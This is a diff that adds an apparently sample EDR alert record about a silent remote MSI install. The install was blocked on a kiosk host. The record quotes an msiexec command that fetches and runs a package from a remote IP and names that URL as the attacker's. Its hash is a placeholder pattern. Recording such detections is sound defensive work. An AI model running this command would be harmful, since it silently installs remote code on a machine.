@@ -1,0 +1,3 @@
+{"alert_name": "Suspicious MSI Install", "timestamp": "2026-07-24T10:18:00Z", "host": "STORE-KIOSK-04", "user": "kiosk_local", "process": "msiexec.exe", "command_line": "msiexec.exe /qn /i https://185.142.223.17/pkg.msi", "sha256": "0011223344556677889900aabbccddeeff00112233445566778899aabbccddee", "action": "blocked", "vendor": "GenericEDR", "detection_name": "Remote MSI Install"}
+
+Attacker URL: https://185.142.223.17/pkg.msi
